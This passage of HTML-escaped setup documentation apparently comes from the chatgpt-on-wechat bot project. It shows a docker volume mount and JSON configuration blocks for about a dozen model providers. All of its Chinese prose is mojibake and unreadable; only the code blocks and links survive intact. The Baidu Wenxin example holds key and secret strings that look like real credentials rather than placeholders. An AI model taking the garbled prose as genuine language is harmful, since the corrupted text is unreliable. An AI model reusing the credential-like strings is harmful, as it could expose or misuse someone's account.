&lt;p&gt;Â¶ÇÊûúÈúÄË¶ÅÂú®dockerÂÆπÂô®‰∏≠‰øÆÊîπÊèí‰ª∂ÈÖçÁΩÆÔºåÂèØÈÄöËøáÊåÇËΩΩÁöÑÊñπÂºèÂÆåÊàêÔºåÂ∞Ü &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/plugins/config.json.template"&gt;Êèí‰ª∂ÈÖçÁΩÆÊñá‰ª∂&lt;/a&gt; ÈáçÂëΩÂêç‰∏∫ &lt;code&gt;config.json&lt;/code&gt;ÔºåÊîæÁΩÆ‰∫é &lt;code&gt;docker-compose.yml&lt;/code&gt; Áõ∏ÂêåÁõÆÂΩï‰∏ãÔºåÂπ∂Âú® &lt;code&gt;docker-compose.yml&lt;/code&gt; ‰∏≠ÁöÑ &lt;code&gt;chatgpt-on-wechat&lt;/code&gt; ÈÉ®ÂàÜ‰∏ãÊ∑ªÂä† &lt;code&gt;volumes&lt;/code&gt; Êò†Â∞Ñ:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;volumes:
  - ./config.json:/app/plugins/config.json
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Ê≥®&lt;/strong&gt;Ôºö‰ΩøÁî®dockerÊñπÂºèÈÉ®ÁΩ≤ÁöÑËØ¶ÁªÜÊïôÁ®ãÂèØ‰ª•ÂèÇËÄÉÔºö&lt;a href="https://www.wangpc.cc/ai/docker-deploy-cow/"&gt;dockerÈÉ®ÁΩ≤CoWÈ°πÁõÆ&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Ê®°ÂûãËØ¥Êòé&lt;/h2&gt; 
&lt;p&gt;‰ª•‰∏ãÂØπÊâÄÊúâÂèØÊîØÊåÅÁöÑÊ®°ÂûãÁöÑÈÖçÁΩÆÂíå‰ΩøÁî®ÊñπÊ≥ïËøõË°åËØ¥ÊòéÔºåÊ®°ÂûãÊé•Âè£ÂÆûÁé∞Âú®È°πÁõÆÁöÑ &lt;code&gt;models/&lt;/code&gt; ÁõÆÂΩï‰∏ã„ÄÇ&lt;/p&gt; 
&lt;details&gt; 
 &lt;summary&gt;OpenAI&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt; &lt;p&gt;API KeyÂàõÂª∫ÔºöÂú® &lt;a href="https://platform.openai.com/api-keys"&gt;OpenAIÂπ≥Âè∞&lt;/a&gt; ÂàõÂª∫API Key&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Â°´ÂÜôÈÖçÁΩÆ&lt;/p&gt; &lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "gpt-4.1-mini",
    "open_ai_api_key": "YOUR_API_KEY",
    "open_ai_api_base": "https://api.openai.com/v1",
    "bot_type": "chatGPT"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ‰∏éOpenAIÊé•Âè£ÁöÑ &lt;a href="https://platform.openai.com/docs/models"&gt;modelÂèÇÊï∞&lt;/a&gt; ‰∏ÄËá¥ÔºåÊîØÊåÅÂåÖÊã¨ oÁ≥ªÂàó„ÄÅgpt-5.2„ÄÅgpt-5.1„ÄÅgpt-4.1Á≠âÁ≥ªÂàóÊ®°Âûã&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: Â¶ÇÊûúÈúÄË¶ÅÊé•ÂÖ•Á¨¨‰∏âÊñπ‰ª£ÁêÜÊé•Âè£ÔºåÂèØÈÄöËøá‰øÆÊîπËØ•ÂèÇÊï∞ËøõË°åÊé•ÂÖ•&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: ‰ΩøÁî®OpenAIÁõ∏ÂÖ≥Ê®°ÂûãÊó∂Êó†ÈúÄÂ°´ÂÜô„ÄÇÂΩì‰ΩøÁî®Á¨¨‰∏âÊñπ‰ª£ÁêÜÊé•Âè£Êé•ÂÖ•ClaudeÁ≠âÈùûOpenAIÂÆòÊñπÊ®°ÂûãÊó∂ÔºåËØ•ÂèÇÊï∞ËÆæ‰∏∫ &lt;code&gt;chatGPT&lt;/code&gt;&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;LinkAI&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt; &lt;p&gt;API KeyÂàõÂª∫ÔºöÂú® &lt;a href="https://link-ai.tech/console/interface"&gt;LinkAIÂπ≥Âè∞&lt;/a&gt; ÂàõÂª∫API Key&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Â°´ÂÜôÈÖçÁΩÆ&lt;/p&gt; &lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "use_linkai": true,
    "linkai_api_key": "YOUR API KEY",
    "linkai_app_code": "YOUR APP CODE"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;use_linkai&lt;/code&gt;: ÊòØÂê¶‰ΩøÁî®LinkAIÊé•Âè£ÔºåÈªòËÆ§ÂÖ≥Èó≠ÔºåËÆæÁΩÆ‰∏∫trueÂêéÂèØÂØπÊé•LinkAIÂπ≥Âè∞ÁöÑÊô∫ËÉΩ‰ΩìÔºå‰ΩøÁî®Áü•ËØÜÂ∫ì„ÄÅÂ∑•‰ΩúÊµÅ„ÄÅÊï∞ÊçÆÂ∫ì„ÄÅMCPÊèí‰ª∂Á≠â‰∏∞ÂØåÁöÑAgentËÉΩÂäõ&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;linkai_api_key&lt;/code&gt;: LinkAIÂπ≥Âè∞ÁöÑAPI KeyÔºåÂèØÂú® &lt;a href="https://link-ai.tech/console/interface"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ‰∏≠ÂàõÂª∫&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;linkai_app_code&lt;/code&gt;: LinkAIÊô∫ËÉΩ‰Ωì (Â∫îÁî®ÊàñÂ∑•‰ΩúÊµÅ) ÁöÑcodeÔºåÈÄâÂ°´ÔºåÊôÆÈÄöÂØπËØùÊ®°ÂºèÂèØÁî®„ÄÇÊô∫ËÉΩ‰ΩìÂàõÂª∫ÂèØÂèÇËÄÉ &lt;a href="https://docs.link-ai.tech/platform/quick-start"&gt;ËØ¥ÊòéÊñáÊ°£&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: modelÂ≠óÊÆµÂ°´ÂÜôÁ©∫ÂàôÁõ¥Êé•‰ΩøÁî®Êô∫ËÉΩ‰ΩìÁöÑÊ®°ÂûãÔºåÂèØÂú®Âπ≥Âè∞‰∏≠ÁÅµÊ¥ªÂàáÊç¢Ôºå&lt;a href="https://link-ai.tech/console/models"&gt;Ê®°ÂûãÂàóË°®&lt;/a&gt;‰∏≠ÁöÑÂÖ®ÈÉ®Ê®°ÂûãÂùáÂèØ‰ΩøÁî®&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;MiniMax&lt;/summary&gt; 
 &lt;p&gt;ÊñπÂºè‰∏ÄÔºöÂÆòÊñπÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ã(Êé®Ëçê)Ôºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "MiniMax-M2.1",
    "minimax_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ÂÜô &lt;code&gt;MiniMax-M2.1„ÄÅMiniMax-M2.1-lightning„ÄÅMiniMax-M2„ÄÅabab6.5-chat&lt;/code&gt; Á≠â&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;minimax_api_key&lt;/code&gt;ÔºöMiniMaxÂπ≥Âè∞ÁöÑAPI-KEYÔºåÂú® &lt;a href="https://platform.minimaxi.com/user-center/basic-information/interface-key"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;ÊñπÂºè‰∫åÔºöOpenAIÂÖºÂÆπÊñπÂºèÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "bot_type": "chatGPT",
  "model": "MiniMax-M2.1",
  "open_ai_api_base": "https://api.minimaxi.com/v1",
  "open_ai_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: OpenAIÂÖºÂÆπÊñπÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ &lt;code&gt;MiniMax-M2.1„ÄÅMiniMax-M2.1-lightning„ÄÅMiniMax-M2&lt;/code&gt;ÔºåÂèÇËÄÉ&lt;a href="https://platform.minimaxi.com/document/%E5%AF%B9%E8%AF%9D?key=66701d281d57f38758d581d0#QklxsNSbaf6kM4j6wjO5eEek"&gt;APIÊñáÊ°£&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: MiniMaxÂπ≥Âè∞APIÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: MiniMaxÂπ≥Âè∞ÁöÑAPI-KEY&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;Êô∫Ë∞±AI (GLM)&lt;/summary&gt; 
 &lt;p&gt;ÊñπÂºè‰∏ÄÔºöÂÆòÊñπÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ã(Êé®Ëçê)Ôºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "model": "glm-4.7",
  "zhipu_ai_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ &lt;code&gt;glm-4.7„ÄÅglm-4-plus„ÄÅglm-4-flash„ÄÅglm-4-air„ÄÅglm-4-airx„ÄÅglm-4-long&lt;/code&gt; Á≠â, ÂèÇËÄÉ &lt;a href="https://bigmodel.cn/dev/api/normal-model/glm-4"&gt;glm-4Á≥ªÂàóÊ®°ÂûãÁºñÁ†Å&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;zhipu_ai_api_key&lt;/code&gt;: Êô∫Ë∞±AIÂπ≥Âè∞ÁöÑ API KEYÔºåÂú® &lt;a href="https://www.bigmodel.cn/usercenter/proj-mgmt/apikeys"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;ÊñπÂºè‰∫åÔºöOpenAIÂÖºÂÆπÊñπÂºèÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "bot_type": "chatGPT",
  "model": "glm-4.7",
  "open_ai_api_base": "https://open.bigmodel.cn/api/paas/v4",
  "open_ai_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: OpenAIÂÖºÂÆπÊñπÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ &lt;code&gt;glm-4.7„ÄÅglm-4.6„ÄÅglm-4-plus„ÄÅglm-4-flash„ÄÅglm-4-air„ÄÅglm-4-airx„ÄÅglm-4-long&lt;/code&gt; Á≠â&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: Êô∫Ë∞±AIÂπ≥Âè∞ÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: Êô∫Ë∞±AIÂπ≥Âè∞ÁöÑ API KEY&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;ÈÄö‰πâÂçÉÈóÆ (Qwen)&lt;/summary&gt; 
 &lt;p&gt;ÊñπÂºè‰∏ÄÔºöÂÆòÊñπSDKÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ã(Êé®Ëçê)Ôºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "qwen3-max",
    "dashscope_api_key": "sk-qVxxxxG"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ÂÜô &lt;code&gt;qwen3-max„ÄÅqwen-max„ÄÅqwen-plus„ÄÅqwen-turbo„ÄÅqwen-long„ÄÅqwq-plus&lt;/code&gt; Á≠â&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;dashscope_api_key&lt;/code&gt;: ÈÄö‰πâÂçÉÈóÆÁöÑ API-KEYÔºåÂèÇËÄÉ &lt;a href="https://bailian.console.aliyun.com/?tab=api#/api"&gt;ÂÆòÊñπÊñáÊ°£&lt;/a&gt; ÔºåÂú® &lt;a href="https://bailian.console.aliyun.com/?tab=model#/api-key"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;ÊñπÂºè‰∫åÔºöOpenAIÂÖºÂÆπÊñπÂºèÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "bot_type": "chatGPT",
  "model": "qwen3-max",
  "open_ai_api_base": "https://dashscope.aliyuncs.com/compatible-mode/v1",
  "open_ai_api_key": "sk-qVxxxxG"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: OpenAIÂÖºÂÆπÊñπÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÊîØÊåÅÂÆòÊñπÊâÄÊúâÊ®°ÂûãÔºåÂèÇËÄÉ&lt;a href="https://help.aliyun.com/zh/model-studio/models?spm=a2c4g.11186623.0.0.78d84823Kth5on#9f8890ce29g5u"&gt;Ê®°ÂûãÂàóË°®&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: ÈÄö‰πâÂçÉÈóÆAPIÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: ÈÄö‰πâÂçÉÈóÆÁöÑ API-KEY&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;Claude&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt; &lt;p&gt;API KeyÂàõÂª∫ÔºöÂú® &lt;a href="https://console.anthropic.com/settings/keys"&gt;ClaudeÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫API Key&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Â°´ÂÜôÈÖçÁΩÆ&lt;/p&gt; &lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "claude-sonnet-4-5",
    "claude_api_key": "YOUR_API_KEY"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèÇËÄÉ &lt;a href="https://docs.anthropic.com/en/docs/about-claude/models/overview#model-aliases"&gt;ÂÆòÊñπÊ®°ÂûãID&lt;/a&gt; ÔºåÊîØÊåÅ &lt;code&gt;claude-sonnet-4-5„ÄÅclaude-sonnet-4-0„ÄÅclaude-opus-4-0„ÄÅclaude-3-5-sonnet-latest&lt;/code&gt; Á≠â&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;Gemini&lt;/summary&gt; 
 &lt;p&gt;API KeyÂàõÂª∫ÔºöÂú® &lt;a href="https://aistudio.google.com/app/apikey?hl=zh-cn"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫API Key ÔºåÈÖçÁΩÆÂ¶Ç‰∏ã&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "gemini-3-flash-preview",
    "gemini_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèÇËÄÉ&lt;a href="https://ai.google.dev/gemini-api/docs/models?hl=zh-cn"&gt;ÂÆòÊñπÊñáÊ°£-Ê®°ÂûãÂàóË°®&lt;/a&gt;ÔºåÊîØÊåÅ &lt;code&gt;gemini-3-flash-preview„ÄÅgemini-3-pro-preview„ÄÅgemini-2.5-pro„ÄÅgemini-2.0-flash&lt;/code&gt; Á≠â&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;DeepSeek&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt; &lt;p&gt;API KeyÂàõÂª∫ÔºöÂú® &lt;a href="https://platform.deepseek.com/api_keys"&gt;DeepSeekÂπ≥Âè∞&lt;/a&gt; ÂàõÂª∫API Key&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Â°´ÂÜôÈÖçÁΩÆ&lt;/p&gt; &lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "deepseek-chat",
    "open_ai_api_key": "sk-xxxxxxxxxxx",
    "open_ai_api_base": "https://api.deepseek.com/v1", 
    "bot_type": "chatGPT"

}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: OpenAIÂÖºÂÆπÊñπÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ &lt;code&gt;deepseek-chat„ÄÅdeepseek-reasoner&lt;/code&gt;ÔºåÂàÜÂà´ÂØπÂ∫îÁöÑÊòØ DeepSeek-V3 Âíå DeepSeek-R1 Ê®°Âûã&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: DeepSeekÂπ≥Âè∞ÁöÑ API Key&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: DeepSeekÂπ≥Âè∞ BASE URL&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;Kimi (Moonshot)&lt;/summary&gt; 
 &lt;p&gt;ÊñπÂºè‰∏ÄÔºöÂÆòÊñπÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "moonshot-v1-128k",
    "moonshot_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ÂÜô &lt;code&gt;moonshot-v1-8k„ÄÅmoonshot-v1-32k„ÄÅmoonshot-v1-128k&lt;/code&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;moonshot_api_key&lt;/code&gt;: MoonshotÁöÑAPI-KEYÔºåÂú® &lt;a href="https://platform.moonshot.cn/console/api-keys"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;ÊñπÂºè‰∫åÔºöOpenAIÂÖºÂÆπÊñπÂºèÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "bot_type": "chatGPT",
  "model": "moonshot-v1-128k",
  "open_ai_api_base": "https://api.moonshot.cn/v1",
  "open_ai_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: OpenAIÂÖºÂÆπÊñπÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ÂÜô &lt;code&gt;moonshot-v1-8k„ÄÅmoonshot-v1-32k„ÄÅmoonshot-v1-128k&lt;/code&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: MoonshotÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: MoonshotÁöÑ API-KEY&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;Azure&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt; &lt;p&gt;API KeyÂàõÂª∫ÔºöÂú® &lt;a href="https://oai.azure.com/"&gt;AzureÂπ≥Âè∞&lt;/a&gt; ÂàõÂª∫API Key&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Â°´ÂÜôÈÖçÁΩÆ&lt;/p&gt; &lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "model": "",
  "use_azure_chatgpt": true,
  "open_ai_api_key": "",
  "open_ai_api_base": "",
  "azure_deployment_id": "",
  "azure_api_version": "2025-01-01-preview"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÁïôÁ©∫Âç≥ÂèØ&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;use_azure_chatgpt&lt;/code&gt;: ËÆæ‰∏∫ true&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: AzureÂπ≥Âè∞ÁöÑÂØÜÈí•&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: AzureÂπ≥Âè∞ÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;azure_deployment_id&lt;/code&gt;: AzureÂπ≥Âè∞ÈÉ®ÁΩ≤ÁöÑÊ®°ÂûãÂêçÁß∞&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;azure_api_version&lt;/code&gt;: apiÁâàÊú¨‰ª•Âèä‰ª•‰∏äÂèÇÊï∞ÂèØ‰ª•Âú®ÈÉ®ÁΩ≤ÁöÑ &lt;a href="https://oai.azure.com/resource/deployments"&gt;Ê®°ÂûãÈÖçÁΩÆ&lt;/a&gt; ÁïåÈù¢Êü•Áúã&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;ÁôæÂ∫¶ÊñáÂøÉ&lt;/summary&gt; ÊñπÂºè‰∏ÄÔºöÂÆòÊñπSDKÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "wenxin-4", 
    "baidu_wenxin_api_key": "IajztZ0bDxgnP9bEykU7lBer",
    "baidu_wenxin_secret_key": "EDPZn6L24uAS9d8RWFfotK47dPvkjD6G"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ &lt;code&gt;wenxin&lt;/code&gt;Âíå&lt;code&gt;wenxin-4&lt;/code&gt;ÔºåÂØπÂ∫îÊ®°Âûã‰∏∫ ÊñáÂøÉ-3.5 Âíå ÊñáÂøÉ-4.0&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;baidu_wenxin_api_key&lt;/code&gt;ÔºöÂèÇËÄÉ &lt;a href="https://cloud.baidu.com/doc/WENXINWORKSHOP/s/dlv4pct3s"&gt;ÂçÉÂ∏ÜÂπ≥Âè∞-access_tokenÈâ¥ÊùÉ&lt;/a&gt; ÊñáÊ°£Ëé∑Âèñ API Key&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;baidu_wenxin_secret_key&lt;/code&gt;ÔºöÂèÇËÄÉ &lt;a href="https://cloud.baidu.com/doc/WENXINWORKSHOP/s/dlv4pct3s"&gt;ÂçÉÂ∏ÜÂπ≥Âè∞-access_tokenÈâ¥ÊùÉ&lt;/a&gt; ÊñáÊ°£Ëé∑Âèñ Secret Key&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;ÊñπÂºè‰∫åÔºöOpenAIÂÖºÂÆπÊñπÂºèÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "bot_type": "chatGPT",
  "model": "ERNIE-4.0-Turbo-8K",
  "open_ai_api_base": "https://qianfan.baidubce.com/v2",
  "open_ai_api_key": "bce-v3/ALTxxxxxxd2b"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: OpenAIÂÖºÂÆπÊñπÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÊîØÊåÅÂÆòÊñπÊâÄÊúâÊ®°ÂûãÔºåÂèÇËÄÉ&lt;a href="https://cloud.baidu.com/doc/WENXINWORKSHOP/s/Wm9cvy6rl"&gt;Ê®°ÂûãÂàóË°®&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: ÁôæÂ∫¶ÊñáÂøÉAPIÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: ÁôæÂ∫¶ÊñáÂøÉÁöÑ API-KEYÔºåÂèÇËÄÉ &lt;a href="https://cloud.baidu.com/doc/qianfan-api/s/ym9chdsy5"&gt;ÂÆòÊñπÊñáÊ°£&lt;/a&gt; ÔºåÂú® &lt;a href="https://console.bce.baidu.com/iam/#/iam/apikey/list"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫API Key&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;ËÆØÈ£ûÊòüÁÅ´&lt;/summary&gt; 
 &lt;p&gt;ÊñπÂºè‰∏ÄÔºöÂÆòÊñπÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö ÂèÇËÄÉ &lt;a href="https://www.xfyun.cn/doc/platform/quickguide.html#%E7%AC%AC%E4%BA%8C%E6%AD%A5-%E5%88%9B%E5%BB%BA%E6%82%A8%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8-%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8%E6%9C%8D%E5%8A%A1"&gt;ÂÆòÊñπÊñáÊ°£-Âø´ÈÄüÊåáÂºï&lt;/a&gt; Ëé∑Âèñ &lt;code&gt;APPID„ÄÅ APISecret„ÄÅ APIKey&lt;/code&gt; ‰∏â‰∏™ÂèÇÊï∞&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "model": "xunfei",
  "xunfei_app_id": "",
  "xunfei_api_key": "",
  "xunfei_api_secret": "",
  "xunfei_domain": "4.0Ultra",
  "xunfei_spark_url": "wss://spark-api.xf-yun.com/v4.0/chat"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: Â°´ &lt;code&gt;xunfei&lt;/code&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;xunfei_domain&lt;/code&gt;: ÂèØÂ°´ÂÜô &lt;code&gt;4.0Ultra„ÄÅgeneralv3.5„ÄÅmax-32k„ÄÅgeneralv3„ÄÅpro-128k„ÄÅlite&lt;/code&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;xunfei_spark_url&lt;/code&gt;: Â°´ÂÜôÂèÇËÄÉ &lt;a href="https://www.xfyun.cn/doc/spark/Web.html#_1-1-%E8%AF%B7%E6%B1%82%E5%9C%B0%E5%9D%80"&gt;ÂÆòÊñπÊñáÊ°£-ËØ∑Ê±ÇÂú∞ÂùÄ&lt;/a&gt; ÁöÑËØ¥Êòé&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;ÊñπÂºè‰∫åÔºöOpenAIÂÖºÂÆπÊñπÂºèÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "bot_type": "chatGPT",
  "model": "4.0Ultra",
  "open_ai_api_base": "https://spark-api-open.xf-yun.com/v1",
  "open_ai_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
